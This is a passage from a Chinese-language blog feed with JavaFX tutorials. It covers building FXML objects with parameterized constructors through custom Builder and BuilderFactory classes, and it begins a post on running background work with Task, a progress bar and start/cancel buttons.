class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(Stage primaryStage)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">FXMLLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FXMLLoader</span>();<br>        loader.setLocation(getClass().getResource(<span class="hljs-string">&quot;Gui/customTag.fxml&quot;</span>));<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> loader.load();<br>        System.out.println(map);<br>        primaryStage.show();<br>    &#125;<br></code></pre></td></tr></table></figure><p>不过这里如何设置<code>ArrayList</code>倒不会了:confused:</p><h2 id="有参构造"><a href="#有参构造" class="headerlink" title="有参构造"></a>有参构造</h2><p>上面实现的是无参构造，但是如果是一个有参构造，那么就会出错。这就需要用到<code>Builder</code>和<code>BuilderFactory</code>了。</p><p>假设<code>Person</code>定义为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sample.datatype;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>定义一个类<code>PersonBuilder</code>实现<code>Builder</code>接口，除了需要重写的<code>build</code>方法，其他都是和<code>Person</code>相同的，<code>build</code>返回的是<code>Person</code>，由于<code>Person</code>是有参构造，所以要设置参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sample.datatype;<br><br><span class="hljs-keyword">import</span> javafx.util.Builder;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PersonBuilder</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Builder</span>&lt;Person&gt; &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Person <span class="hljs-title function_">build</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(name, age);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后定义类<code>PersonBuilderFactory</code>实现<code>BuilderFactory</code>接口，需要重写<code>getBuilder</code>方法，这里需要判断<code>type</code>的类型，如果是<code>Person</code>就返回<code>PersonBuilder</code>，如果不是的话，就返回默认的<code>Builder</code>，默认的<code>BuilderFactory</code>是<code>JavaFXBuilderFactory</code>，<code>JavaFXBuilderFactory</code>有一个方法<code>getBuilder</code>，会根据参数<code>type</code>返回对应实例的<code>Builder</code>，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sample.datatype;<br><br><span class="hljs-keyword">import</span> javafx.fxml.JavaFXBuilderFactory;<br><span class="hljs-keyword">import</span> javafx.util.Builder;<br><span class="hljs-keyword">import</span> javafx.util.BuilderFactory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PersonBuilderFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BuilderFactory</span> &#123;<br><br>    <span class="hljs-comment">// 默认的BuilderFactory</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">JavaFXBuilderFactory</span> <span class="hljs-variable">jff</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaFXBuilderFactory</span>();<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Builder&lt;?&gt; getBuilder(Class&lt;?&gt; type) &#123;<br><br>        <span class="hljs-keyword">if</span> (type == Person.class)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PersonBuilder</span>();<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> jff.getBuilder(type);<br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>接着在FXML文件中就可以设置参数了，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><br><span class="hljs-meta">&lt;?import sample.datatype.Person?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Person</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;YY&quot;</span> <span class="hljs-attr">age</span>=<span class="hljs-string">&quot;18&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">Person</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>最后在<code>customMain</code>加载FXML文件，这里需要设置<code>BuilderFactory</code>，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sample;<br><br><span class="hljs-keyword">import</span> javafx.application.Application;<br><span class="hljs-keyword">import</span> javafx.fxml.FXMLLoader;<br><span class="hljs-keyword">import</span> javafx.stage.Stage;<br><span class="hljs-keyword">import</span> sample.datatype.Person;<br><span class="hljs-keyword">import</span> sample.datatype.PersonBuilderFactory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">customMain</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Application</span><br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        launch(args);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(Stage primaryStage)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">FXMLLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FXMLLoader</span>();<br>        loader.setLocation(getClass().getResource(<span class="hljs-string">&quot;Gui/customTag.fxml&quot;</span>));<br>        loader.setBuilderFactory(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PersonBuilderFactory</span>());<br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> loader.load();<br>        System.out.println(person.getName() + <span class="hljs-string">&quot; - &quot;</span> + person.getAge());<br><br>        primaryStage.show();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这样就会输出FXML中设置的值了。</p><p>这里的流程是这样的：加载FXML文件时，发现了<code>Person</code>，然后在<code>BuilderFactory</code>中寻找<code>Builder</code>，由于指定了<code>Builder</code>，所以会去指定的<code>Builder</code>中构造，最后返回构造后的类。</p><h2 id="有参构造–Map方法"><a href="#有参构造–Map方法" class="headerlink" title="有参构造–Map方法"></a>有参构造–Map方法</h2><p>还有另一种方法实现有参构造。<code>Person</code>类不变。FXML文件不变。</p><p>设置<code>PersonBuilderMap</code>类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sample.datatype;<br><br><span class="hljs-keyword">import</span> javafx.util.Builder;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PersonBuilderMap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Builder</span>&lt;Person&gt; &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">put</span><span class="hljs-params">(String key, Object value)</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;name&quot;</span>.equals(key))&#123;<br>            <span class="hljs-built_in">this</span>.name = String.valueOf(value);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;age&quot;</span>.equals(key))&#123;<br>            <span class="hljs-built_in">this</span>.age = Integer.parseInt(String.valueOf(value));<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Person <span class="hljs-title function_">build</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(name, age);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>设置<code>PersonBuilderFactoryMap</code>类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sample.datatype;<br><br><span class="hljs-keyword">import</span> javafx.fxml.JavaFXBuilderFactory;<br><span class="hljs-keyword">import</span> javafx.util.Builder;<br><span class="hljs-keyword">import</span> javafx.util.BuilderFactory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PersonBuilderFactoryMap</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BuilderFactory</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">JavaFXBuilderFactory</span> <span class="hljs-variable">jff</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaFXBuilderFactory</span>();<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Builder&lt;?&gt; getBuilder(Class&lt;?&gt; type) &#123;<br>        <span class="hljs-keyword">if</span> (type == Person.class)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PersonBuilderMap</span>();<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> jff.getBuilder(type);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>customMain</code>中使用上面的<code>BuilderFactory</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sample;<br><br><span class="hljs-keyword">import</span> javafx.application.Application;<br><span class="hljs-keyword">import</span> javafx.fxml.FXMLLoader;<br><span class="hljs-keyword">import</span> javafx.stage.Stage;<br><span class="hljs-keyword">import</span> sample.datatype.Person;<br><span class="hljs-keyword">import</span> sample.datatype.PersonBuilderFactoryMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">customMain</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Application</span><br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        launch(args);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(Stage primaryStage)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">FXMLLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FXMLLoader</span>();<br>        loader.setLocation(getClass().getResource(<span class="hljs-string">&quot;Gui/customTag.fxml&quot;</span>));<br>        loader.setBuilderFactory(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PersonBuilderFactoryMap</span>());<br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> loader.load();<br>        System.out.println(person.getName() + <span class="hljs-string">&quot; - &quot;</span> + person.getAge());<br><br>        primaryStage.show();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>实现结果一样的。</p>]]></content>
    
    
    <categories>
      
      <category>javafx</category>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>javafx</tag>
      
      <tag>gui</tag>
      
      <tag>fxml</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[javafx] JavaFx多线程任务</title>
    <link href="/2022/10/04/%5Bjavafx%5D%20JavaFx%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%BB%BB%E5%8A%A1/"/>
    <url>/2022/10/04/%5Bjavafx%5D%20JavaFx%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%BB%BB%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="JavaFx多线程任务"><a href="#JavaFx多线程任务" class="headerlink" title="JavaFx多线程任务"></a>JavaFx多线程任务</h1><p><code>javafx</code>运行时界面运行在主线程<code>javafx application</code>中，用于更新UI，但是如果执行了耗时的任务，比如网络请求，文件读写等操作，会导致线程阻塞，出现<strong>界面无响应</strong>的问题。</p><p><code>javafx</code>提供了接口<code>Worker</code>，包括了三个类</p><ul><li><code>ScheduledService</code></li><li><code>Service</code></li><li><code>Task</code></li></ul><h2 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h2><p>假设需要一个应用：通过点击<code>开始</code>按钮执行任务，并有进度条来显示任务进度，并显示任务的相关信息，可以使用<code>取消</code>按钮来取消任务；</p><p>首先写一个简单的布局</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fxTask</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Application</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        launch(args);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(Stage primaryStage)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Button</span> <span class="hljs-variable">startBt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;开始&quot;</span>);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">cancelBt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;取消&quot;</span>);<br><br>        <span class="hljs-type">ProgressBar</span> <span class="hljs-variable">progressBar</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProgressBar</span>(<span class="hljs-number">0</span>);<br>        progressBar.setPrefWidth(<span class="hljs-number">200</span>);<br><br>        <span class="hljs-type">Label</span> <span class="hljs-variable">l1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;state&quot;</span>);<br>        <span class="hljs-type">Label</span> <span class="hljs-variable">l2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;value&quot;</span>);<br>        <span class="hljs-type">Label</span> <span class="hljs-variable">l3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;title&quot;</span>);<br>        <span class="hljs-type">Label</span> <span class="hljs-variable">l4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;message&quot;</span>);<br><br>        <span class="hljs-type">HBox</span> <span class="hljs-variable">hBox</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HBox</span>();<br>        hBox.setAlignment(Pos.CENTER);<br>        hBox.setSpacing(<span class="hljs-number">10.0</span>);<br><br>        hBox.getChildren().addAll(startBt, cancelBt, progressBar, l1, l2, l3, l4);<br><br>        <span class="hljs-type">AnchorPane</span> <span class="hljs-variable">anchorPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnchorPane</span>();<br>        anchorPane.setStyle(<span class="hljs-string">&quot;-fx-background-color: #7bb9b0;&quot;</span>);<br>        anchorPane.getChildren().add(hBox);<br><br>        AnchorPane.setLeftAnchor(hBox, <span class="hljs-number">100.0</span>);<br>        AnchorPane.setTopAnchor(hBox, <span class="hljs-number">100.0</span>);<br><br>        <span class="hljs-type">Scene</span> <span class="hljs-variable">scene</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scene</span>(anchorPane);<br>        primaryStage.setScene(scene);<br>        primaryStage.setTitle(<span class="hljs-string">&quot;javaFX&quot;</span>);<br>        primaryStage.setWidth(<span class="hljs-number">700</span>);<br>        primaryStage.setHeight(<span class="hljs-number">500</span>);<br>        primaryStage.show();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221004143629437.png" alt="image-20221004143629437"></p><p>定义一个任务类，继承<code>Task</code>，需要指定泛型来设置返回类型，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTask</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Task</span>&lt;Number&gt; &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateProgress</span><span class="hljs-params">(<span class="hljs-type">long</span> workDone, <span class="hljs-type">long</span> max)</span> &#123;<br>        <span class="hljs-built_in">super</span>.updateProgress(workDone, max);<br>        <span class="hljs-comment">// 这里设置任务进度</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateProgress</span><span class="hljs-params">(<span class="hljs-type">double</span> workDone, <span class="hljs-type">double</span> max)</span> &#123;<br>        <span class="hljs-built_in">super</span>.updateProgress(workDone, max);<br>        <span class="hljs-comment">// 这里设置任务进度</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateMessage</span><span class="hljs-params">(String message)</span> &#123;<br>        <span class="hljs-built_in">super</span>.updateMessage(message);<br>        <span class="hljs-comment">// 这里设置任务中的信息</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateTitle</span><span class="hljs-params">(String title)</span> &#123;<br>        <span class="hljs-built_in">super</span>.updateTitle(title);<br>        <span class="hljs-comment">// 这里更新任务名</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateValue</span><span class="hljs-params">(Number value)</span> &#123;<br>        <span class="hljs-built_in">super</span>.updateValue(value);<br>        <span class="hljs-comment">// 在这里返回结果</span><br>        <br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> Number <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 这里是任务主体</span><br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在主程序中设置任务，绑定按钮点击事件，这样点击<code>开始</code>按钮后任务就开始了，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">MyTask</span> <span class="hljs-variable">myTask</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyTask</span>();<br><br><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(myTask);<br><br>startBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>        thread.start();<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>需要注意的是这里执行的时候是新开的一个线程，与UI相关的都是<code>FXApplication</code>线程完成的，即主线程；所以点击按钮后，一个新的线程执行任务，返回结果会到主线程中；在任务中和返回结果出打印线程，</p><figure class="highlight 